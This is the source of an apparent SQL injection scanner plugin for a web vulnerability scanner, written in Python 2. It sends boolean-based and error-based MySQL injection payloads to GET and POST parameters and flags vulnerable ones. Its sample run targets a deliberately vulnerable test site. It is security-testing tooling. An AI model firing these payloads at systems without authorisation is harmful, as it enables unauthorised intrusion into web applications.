# coding=utf-8
'''
sql.py
'''
import sys
sys.path.append("..")
import teye_config as Settings

import re
import copy

from LogManager import log

import copy
# wCurl
from wCurl import wcurl
from hashes.simhash import simhash

from teye_web.http.Request import Request
from teye_web.http.postdata import postdata
from teye_web.util.smart_fill import smart_fill
from teye_web.util.rand_string import rand_char, rand_number, rand_letter

import teye_data.severity as severity
from teye_data.vuln import vuln
from teye_data.vulnmanager import vm


class sql:
    '''
    '''

    def __init__(self):
        '''
        '''
        self._true_threshold = 0.85

        self._false_threshold = 0.90

        # 扫描模式:0为普通模式，1为验证模式
        self._scan_mode = 0

        self._sql_verify_value = "(select{watscan watscan}from(SELECT COUNT(*),CONCAT(0x73716C,(SELECT (ELT(2085=2085,1))),0x5F766572696679,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

        self._sql_verify_key = "sql1_verify1"

        self._white_param = ["csrf_token", "captcha", "sign", "_"]

    def check(self, t_request):
        '''
        '''
        log.info(u"正在检测目标是否存在SQL注入漏洞...")
        http_request = copy.deepcopy(t_request)
        # param {"id":"d","tp":"ttt","name":""}
        if http_request.get_method() == "GET":
            param_dict = http_request.get_get_param()

        if http_request.get_method() == "POST":
            param_dict = http_request.get_post_param()

        sql_payload_list = self._get_payload_list(param_dict)

        error_param_list = []
        for name, poc_true, poc_false, poc_type in sql_payload_list:
            if name.lower() in self._white_param:
                continue

            # print "Fuzz Name:" + name +" Fuzz Type:" + poc_type
            if http_request.get_method() == "GET":
                url_obj = http_request.get_url()
                normal_resp = wcurl.get(url_obj.get_url_string())
                true_resp = wcurl.get(url_obj.get_uri_string(), params=poc_true)
                false_resp = wcurl.get(url_obj.get_uri_string(), params=poc_false)

                if name not in error_param_list:
                    error_param_list.append(name)
                    # 404_resp
                    temp_dict = copy.deepcopy(param_dict)
                    temp_dict[name] = "'\")(wat)'\"%27"
                    error_param = temp_dict
                    error_resp = wcurl.get(url_obj.get_uri_string(), params=error_param)
                    if self._find_sql_error(error_resp.body):
                        v = vuln()
                        url = error_resp.get_url()
                        v.set_url(url.get_uri_string() + "?" + str(error_param))
                        v.set_method("GET")
                        v.set_param(name)
                        v.set_name("数据库运行错误")
                        v.set_rank(severity.M)
                        vm.append(self, url.get_host(), "dberror", v)

                        log.info("DB Error Vuln")
                        print "----------DB Error Vuln"

                        if self._verify_sql_vuln(http_request, v, name, poc_type):
                            v = vuln()
                            url = error_resp.get_url()
                            v.set_url(url.get_uri_string() + "?" + str(poc_true))
                            v.set_method("GET")
                            v.set_param(name)
                            v.set_name("SQL注入漏洞")
                            v.set_rank(severity.H)
                            vm.append(self, url.get_host(), "sql", v)
                            log.info("SQL Vuln")
                            print u"SQL Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)
                            break

                if true_resp.body == false_resp.body:
                    continue

                if self._get_diff_ratio(false_resp.body, normal_resp.body) > self._false_threshold:
                    continue

                if self._get_diff_ratio(normal_resp.body, true_resp.body) > self._true_threshold:
                    # security_hole()
                    v = vuln()
                    url = true_resp.get_url()
                    v.set_url(url.get_uri_string() + "?" + str(poc_true))
                    v.set_method("GET")
                    v.set_param(name)
                    v.set_name("SQL注入漏洞")
                    v.set_rank(severity.H)

                    if self._scan_mode == 0:
                        vm.append(self, url.get_host(), "sql", v)
                        log.info("SQL Vuln")
                        print u"SQL Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)
                        break
                    else:
                        if self._verify_sql_vuln(http_request, v, name, poc_type):
                            vm.append(self, url.get_host(), "sql", v)
                            log.info("SQL Vuln")
                            print u"SQL Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)
                            break

            if http_request.get_method() == "POST":
                url_obj = http_request.get_url()

                normal_resp = wcurl.post(url_obj.get_url_string())

                true_resp = wcurl.post(url_obj.get_uri_string(), data=poc_true)
                false_resp = wcurl.post(url_obj.get_uri_string(), data=poc_false)

                if name not in error_param_list:
                    error_param_list.append(name)
                    # 404_resp
                    temp_dict = copy.deepcopy(param_dict)
                    temp_dict[name] = "'\")(wat)'\"%27"
                    error_param = temp_dict
                    error_resp = wcurl.post(url_obj.get_uri_string(), data=error_param)
                    if self._find_sql_error(error_resp.body):
                        v = vuln()
                        url = error_resp.get_url()
                        v.set_url(url.get_uri_string() + "?" + str(error_param))
                        v.set_method("POST")
                        v.set_param(name)
                        v.set_name(u"数据库运行错误")
                        v.set_rank(severity.H)
                        vm.append(self, url.get_host(), "dberror", v)

                        log.info("DB Error Vuln")
                        print "----------DB Error Vuln"

                        if self._verify_sql_vuln(http_request, v, name, poc_type):
                            v = vuln()
                            url = error_resp.get_url()
                            v.set_url(url.get_uri_string() + "?" + str(poc_true))
                            v.set_method("POST")
                            v.set_param(name)
                            v.set_name("SQL注入漏洞")
                            v.set_rank(severity.H)
                            vm.append(self, url.get_host(), "sql", v)
                            log.info("SQL Vuln")
                            print u"SQL Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)
                            break

                if true_resp.body == false_resp.body:
                    continue

                if self._get_diff_ratio(false_resp.body, normal_resp.body) > self._false_threshold:
                    continue

                if self._get_diff_ratio(normal_resp.body, true_resp.body) > self._true_threshold:
                    # security_hole()
                    v = vuln()
                    url = true_resp.get_url()
                    v.set_url(url.get_uri_string() + "," + str(poc_true))
                    v.set_method("POST")
                    v.set_param(name)
                    v.set_name("SQL注入漏洞")
                    v.set_rank(severity.H)
                    if self._verify_sql_vuln(http_request, v, name, poc_type):
                        vm.append(self, url.get_host(), "sql", v)
                        log.info("SQL Vuln")
                        print u"SQL Vuln 漏洞URL:%s,漏洞参数:%s" % (url, name)
                        break

    def _verify_sql_vuln(self, http_request, vuln_inst, name, poc_type):
        '''
        '''
        if http_request.get_method() == "GET":
            param_dict = http_request.get_get_param()
        elif http_request.get_method() == "POST":
            param_dict = http_request.get_post_param()

        temp_param_dict = copy.deepcopy(param_dict)
        temp_value = temp_param_dict[name]

        if type(temp_value) is list:
            origin_value = "".join(temp_value)
        else:
            origin_value = temp_value

        if poc_type == "number":
            verify_value = '%s AND %s' % (origin_value, self._sql_verify_value)
        elif poc_type == "single":
            verify_value = "%s' and %s --" % (origin_value, self._sql_verify_value)
        elif poc_type == "double":
            verify_value = '%s" and %s --' % (origin_value, self._sql_verify_value)

        temp_param_dict[name] = verify_value

        if vuln_inst.get_method() == "GET":
            resp = wcurl.get(http_request.get_url().get_uri_string(), params=temp_param_dict)

        elif vuln_inst.get_method() == "POST":
            resp = wcurl.post(http_request.get_url().get_uri_string(), data=temp_param_dict)

        if self._find_verify_key(resp):
            return True
        else:
            return False

    def _find_verify_key(self, resp):
        '''
        '''
        if resp is None:
            return False

        resp_body = resp.body
        wat_regex = re.compile(self._sql_verify_key, re.IGNORECASE)
        match = wat_regex.search(resp_body)
        if match:
            return True

        return False

    def _get_diff_ratio(self, a_str, b_str):
        '''
        '''
        if a_str == None or b_str == None:
            return 0

        a_hash = simhash(a_str.split())
        b_hash = simhash(b_str.split())
        ratio = a_hash.similarity(b_hash)
        return ratio

    def _find_sql_error(self, a_str):
        '''
        '''
        error_key_list = [
            "Error:you\s*have\s*an\s*error\s*in\s*your\s*SQL\s*syntax",
            "Warning:\s*mysql_fetch_array\(\)"
        ]
        if a_str is None:
            return False
        for item in error_key_list:
            wat_regex = re.compile(item, re.IGNORECASE)
            match = wat_regex.search(a_str)
            if match:
                return True

        return False

    def _fill_param(self, param):
        '''
        @param:{"a":[1]}
        '''
        param_dict = copy.deepcopy(param)
        for key, value in param_dict.iteritems():
            if type(value) is list:
                str_value = "".join(value)
            else:
                str_value = value

            if str_value == "":
                param_dict[key] = smart_fill(key)

        return param_dict

    def _get_payload_list(self, param):
        '''
        '''
        res = []

        o_param_dict = self._fill_param(param)

        o_param_key = o_param_dict.keys()

        for name in o_param_key:
            v = o_param_dict.get(name)
            if type(v) is list:
                o_v = "".join(v)
            else:
                o_v = v

            rndnum = int(rand_number(3))

            payload_list = []

            # number
            payload_true = '%s AND %i=%i' % (o_v, rndnum, rndnum)
            payload_false = '%s AND %i=%i' % (o_v, rndnum, rndnum + 1)

            payload_list.append((payload_true, payload_false, "number"))

            # Single quotes
            payload_true = "%s' AND '%i'='%i" % (o_v, rndnum, rndnum)
            payload_false = "%s' AND '%i'='%i" % (o_v, rndnum, rndnum + 1)

            payload_list.append((payload_true, payload_false, "single"))

            # Double quotes
            payload_true = '%s" AND "%i"="%i' % (o_v, rndnum, rndnum)
            payload_false = '%s" AND "%i"="%i' % (o_v, rndnum, rndnum + 1)

            payload_list.append((payload_true, payload_false, "double"))

            # Single search
            payload_true = "%s%%' AND %i=%i AND '%%'='" % (o_v, rndnum, rndnum)
            payload_false = "%s%%' AND %i=%i AND '%%'='" % (o_v, rndnum, rndnum + 1)

            payload_list.append((payload_true, payload_false, "search_single"))

            # Dobule search
            payload_true = '%s%%" AND %i=%i AND "%%"="' % (o_v, rndnum, rndnum)
            payload_false = '%s%%" AND %i=%i AND "%%"="' % (o_v, rndnum, rndnum + 1)

            payload_list.append((payload_true, payload_false, "search_double"))

            for poc_true, poc_false, poc_type in payload_list:
                # 深拷贝，产生新的变量
                true_param_dict = copy.deepcopy(o_param_dict)
                true_param_dict[name] = poc_true

                false_param_dict = copy.deepcopy(o_param_dict)
                false_param_dict[name] = poc_false

                poc_tuple = (name, true_param_dict, false_param_dict, poc_type)

                res.append(poc_tuple)

        return res

    def get_name(self):
        '''
        '''
        return "teye_sql_plugin"


if __name__ == "__main__":
    '''
    '''
    url_1 = "http://testphp.vulnweb.com:80/listproducts.php?cat=1"
    url_2 = "http://testphp.vulnweb.com:80/artists.php?artist=3"
    url_3 = "http://testphp.vulnweb.com:80/comment.php?aid=3"
    req_1 = Request(url_1)
    req_2 = Request(url_2)
    req_3 = Request(url_3)
    t_scanner = sql()
    t_scanner.check(req_1)
    t_scanner.check(req_2)
    t_scanner.check(req_3)
    print vm.get_all_vuln()
